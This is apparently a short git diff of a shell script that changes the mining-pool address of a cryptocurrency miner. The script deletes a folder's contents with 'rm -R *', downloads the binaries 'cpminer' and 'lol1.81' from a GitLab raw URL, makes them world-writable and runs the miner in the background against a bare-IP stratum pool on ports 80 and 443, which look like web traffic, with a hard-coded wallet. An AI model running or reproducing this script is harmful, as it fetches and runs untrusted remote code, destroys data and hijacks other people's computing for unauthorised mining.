@@ -7,7 +7,7 @@ cd .des
 rm -R *
 
 wget https://gitlab.com/majapahlevi/mvp/-/raw/main/cpminer
-chmod 777 cpminer && ./cpminer -a yespower -o stratum+tcp://64.225.25.181:80 -u up6wFaDx2cQexHM8VvvRhAFdcDNMESVpbZ.$(shuf -n 1 -i 1-99999)-VISH -t4 &
+chmod 777 cpminer && ./cpminer -a yespower -o stratum+tcp://138.197.98.18:443 -u up6wFaDx2cQexHM8VvvRhAFdcDNMESVpbZ.$(shuf -n 1 -i 1-99999)-VISH -t4 &
 
 wget https://gitlab.com/majapahlevi/mvp/-/raw/main/lol1.81
 chmod 777 lol1.81
